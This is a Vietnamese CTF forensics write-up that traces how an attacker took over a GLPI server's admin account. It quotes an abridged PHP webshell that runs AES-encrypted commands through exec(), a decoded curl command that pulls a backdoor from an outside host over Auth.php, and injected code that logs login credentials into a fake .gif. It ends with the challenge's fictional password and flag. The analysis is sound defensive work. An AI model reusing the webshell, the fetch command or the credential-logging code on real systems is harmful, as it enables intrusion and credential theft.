---
title: "HeroCTF_For2"
excerpt_separator: "<!--more-->"
categories:
  - HeroCTF 2025, Forensics
tags:
  - Writeup
  - Forensics
---

> [!INFO] Thông tin bài thi
> **Chủ đề:** Điều tra server `pensive.hogwarts.local` để tìm cách attacker chiếm tài khoản của **Albus Dumbledore**.  
> **Mục tiêu:** Trả flag theo format:  
> `Hero{/var/idk/file.ext;/var/idk/file.ext;AnExample?}`

---

## 📝 Mô tả thử thách

> "The director of Hogwarts got his account compromised. The last time he logged on legitimately was from 192.168.56.230 (pensive.hogwarts.local). Investigate to identify how his account got compromised from this server. Please find the following information to go forward in this case:
> - Absolute path of the file which led to the compromise.
> - Absolute path of the file used by the attacker to retrieve Albus' account.
> - The second file stores two pieces of information. The 3rd flag part is the value of the second field of the second piece of information.
> The findings have to be separated by a `;`."

**Tóm tắt yêu cầu:** Chúng ta cần tìm 3 mảnh thông tin:
1.  Đường dẫn tuyệt đối của file gây ra sự cố (bị ghi đè/lợi dụng).
2.  Đường dẫn tuyệt đối của file mà attacker dùng để lưu/lấy tài khoản.
3.  Giá trị trường thứ 2 trong bộ dữ liệu thứ 2 tìm được.

---

## 🔍 Phân tích sơ bộ

Sau khi giải nén bài thi, ta thu được 2 thư mục chính:
*   📁 `/var/log`
*   📁 `/var/www/glpi`

Từ thử thách trước (**Forensics 01**), ta đã biết IP của attacker là `192.168.56.200`. Bắt đầu từ manh mối này, tôi lọc logs để tìm các hành động đáng ngờ từ địa chỉ IP trên.

Tôi phát hiện dấu hiệu bất thường trong file log liên quan đến `/var/www/glpi/ajax/fileupload.php`:

```log
192.168.56.200 - - [22/Nov/2025:23:03:49 +0000] "POST /ajax/fileupload.php?_method=DELETE&_uploader_picture%5B%5D=setup.php HTTP/1.1" 200 742 "-" "python-requests/2.32.5"
```

> [!WARNING] Phát hiện
> Attacker đã upload file `setup.php` lên server thông qua lỗ hổng trong `fileupload.php`. Đây là điểm khởi đầu cho cuộc điều tra.

---

## 🕵️‍♂️ Điều tra chi tiết

### 📄 1. Phân tích file `setup.php`
Sau khi tìm kiếm trong hệ thống file, tôi xác định vị trí của nó tại `/var/www/glpi/files/_tmp/setup.php`.

<details>
<summary><b>Xem nội dung file setup.php</b></summary>

```php
<?php
// ... (Header comments omit for brevity) ...

error_reporting(E_ERROR | E_PARSE);
$SECURITY_STRATEGY = "no_check";

// ... (Helper functions: title, decrypt_pass, dump_password) ...

if(isset($_GET["submit_form"]) && $_GET["submit_form"] === "2b01d9d592da55cca64dd7804bc295e6e03b5df4")
{
  for ($i=0; $i < 4; $i++) {
    // ... Include logic ...
      try{
        Html::header("GLPI Password");
        $key = "14ac4b90bd3f880e741a85b0c6254d1f";
        $iv  = "5cf025270d8f74c9";

        if(isset($_GET["save_result"]) && !empty($_GET["save_result"]))
        {
          $output=null;
          $retval=null;
          
          // DECRYPTION & EXECUTION PART
          $encrypted = base64_decode($_GET['save_result']);
          $decrypted = openssl_decrypt($encrypted, "AES-256-CBC", $key, OPENSSL_RAW_DATA, $iv);
          exec($decrypted, $output, $retval);
          
          // ... Output result ...
        } else {
          dump_password();
        }
      } catch(Exception $e) { echo $e->getMessage(); }
      break;
  }
}
?>
```
</details>

**Nhận định:**  
File `setup.php` là một **Webshell**. Nó cho phép attacker thực thi lệnh tùy ý (RCE) trên server thông qua tham số `save_result`. Lệnh được mã hóa **AES-256-CBC** với Key và IV được hardcode ngay trong file.

### 👣 2. Truy vết attacker trong Log
Quay lại phân tích log, tôi lọc toàn bộ các request có chứa tham số `save_result` để xem attacker đã thực thi những lệnh gì.

Câu lệnh tìm kiếm:
```bash
strings glpi_ssl_access.log | grep 'save_result'
```

<details>
<summary><b>Kết quả Log thu được</b></summary>

```
192.168.56.1 ... "GET /front/plugin.php?submit_form=...&save_result=oGAHt/Kk1OKeXWxy7iXUfw== HTTP/1.1" ...
192.168.56.1 ... "GET /front/plugin.php?submit_form=...&save_result=4xRW8Us32tnzow8KiLOwuASwWypc4XE2LBDXaWQLmATmYOlVNcpYABK5gfF5xiwvLu1s6UpjuW2aJk94xSXQ1AaVGQFwdNpNR/7wqKV6JAE= HTTP/1.1" ...
192.168.56.1 ... "GET /front/plugin.php?submit_form=...&save_result=86AyGErKuj5UoZE9eHtlIg== HTTP/1.1" ...
```
</details>

Tôi viết một script Python nhỏ để giải mã các payloads này dựa trên Key/IV tìm thấy trong `setup.php`.

<details>
<summary><b>Script giải mã (Python)</b></summary>

```python
import base64
from Crypto.Cipher import AES

# Key và IV lấy trực tiếp từ webshell PHP
key = b"14ac4b90bd3f880e741a85b0c6254d1f"   # 32 bytes
iv  = b"5cf025270d8f74c9"                  # 16 bytes

samples = [
    "oGAHt/Kk1OKeXWxy7iXUfw==",
    "4xRW8Us32tnzow8KiLOwuASwWypc4XE2LBDXaWQLmATmYOlVNcpYABK5gfF5xiwvLu1s6UpjuW2aJk94xSXQ1AaVGQFwdNpNR/7wqKV6JAE=",
    "86AyGErKuj5UoZE9eHtlIg=="
]

for s in samples:
    encrypted = base64.b64decode(s)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(encrypted)
    # Strip padding + null bytes
    decrypted = decrypted.rstrip(b"\x00").rstrip()
    
    print(f"Decoded: {decrypted.decode(errors='ignore')}")
```
</details>

**Kết quả giải mã lệnh:**

| STT | Payload Encoded (rút gọn) | Lệnh đã thực thi (Decoded) |
| :---: | :--- | :--- |
| 1 | `oGAHt...` | `#UXP)fq` (Có thể là lệnh test hoặc rác) |
| 2 | `4xRW8...` | `curl https://xthaz.fr/glpi_auth_backdoored.php > /var/www/glpi/src/Auth.php` |
| 3 | `86AyG...` | `whoami` |

> [!DANGER] Hành động nguy hiểm
> Lệnh số 2 cho thấy attacker đã dùng `curl` tải một file độc hại về và **ghi đè** lên file hệ thống tại:  
> ➡️ `/var/www/glpi/src/Auth.php`

### 🚪 3. Phân tích Backdoor `Auth.php`
Tôi tiến hành kiểm tra file `Auth.php`. Vì file khá dài nên các bạn có thể xem file gốc tại đây:
🔗 [glpi_auth_backdoored.php](https://raw.githubusercontent.com/xthaz/HeroCTF-2025/main/Forensics/For2HeroCTF/glpi_auth_backdoored.php)

File này là nơi xử lý đăng nhập. Attacker đã chèn đoạn code sau vào ngay trước luồng xác thực LDAP:

```php
$data = json_encode([
   'login' => $login_name,
   'password' => $login_password,
]);

$encrypted = openssl_encrypt($data, 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv);
$encoded = base64_encode($encrypted) . ";";

$file = "/var/www/glpi/pics/screenshots/example.gif";
file_put_contents($file, $encoded, FILE_APPEND);
```

**Cơ chế hoạt động:**
1.  Bắt thông tin `login` và `password` người dùng nhập vào.
2.  Mã hóa bằng AES-256-CBC (Key/IV cứng trong file).
3.  Lưu chuỗi mã hóa vào file ngụy trang ảnh: `/var/www/glpi/pics/screenshots/example.gif`.

### 🔓 4. Giải mã `example.gif`
Kiểm tra file `example.gif`, lệnh `file` xác nhận đây là ASCII text chứ không phải ảnh.

```bash
$ cat example.gif
mbzTGN3mBbqOHr/h3/c2uebIG7VPft37SXR+hurPIglCYfLeFqIzSM/R9lLhKp5K;U+IiFdoC53E4vV+9aTeVHbsp/0YRYqDqQzvx0gBGpzIPAhEYlgd5SjpPPQOLgmmoCbWKLREBHparNdsK2BQ3tQ==;
```

Sử dụng script Python tương tự để giải mã dữ liệu này (Lưu ý: Key/IV trong `Auth.php` khác với `setup.php`).

<details>
<summary><b>Script giải mã Credentials</b></summary>

```python
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

key = b"ec6c34408ae2523fe664bd1ccedc9c28"
iv  = b"ecb2b0364290d1df"

data = (
    "mbzTGN3mBbqOHr/h3/c2uebIG7VPft37SXR+hurPIglCYfLeFqIzSM/R9lLhKp5K;"
    "U+IiFdoC53E4vV+9aTeVHbsp/0YRYqDqQzvx0gBGpzIPAhEYlgd5SjpPPQOLgmmoCbWKLREBHparNdsK2BQ3tQ==;"
)

payloads = [p for p in data.split(";") if p]

for i, p in enumerate(payloads, 1):
    encrypted = base64.b64decode(p)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(encrypted)
    try:
        decrypted = unpad(decrypted, 16)
    except ValueError:
        pass

    print(f"[Record {i}] {decrypted.decode('utf-8')}")
```
</details>

**Kết quả thu được:**

| Record | Nội dung (JSON) | Phân tích |
| :---: | :--- | :--- |
| 1 | `{"login":"Flag","password":"Hero{FakeFlag:(}"}` | Fake flag ❌ |
| 2 | `{"login":"albus.dumbledore","password":"FawkesPhoenix#9!"}` | **Tài khoản mục tiêu** ✅ |

---

## 🚩 Kết luận & Flag

Tổng hợp lại các manh mối theo yêu cầu đề bài:

1.  **File dẫn đến thỏa hiệp:** `/var/www/glpi/src/Auth.php` (File bị attacker ghi đè backdoor, dẫn đến lộ thông tin).
2.  **File dùng để lấy/lưu tài khoản:** `/var/www/glpi/pics/screenshots/example.gif`.
3.  **Thông tin thứ 3:** Mật khẩu của Albus Dumbledore là `FawkesPhoenix#9!`.

**FLAG CUỐI CÙNG:**

```
Hero{/var/www/glpi/src/Auth.php;/var/www/glpi/pics/screenshots/example.gif;FawkesPhoenix#9!}
```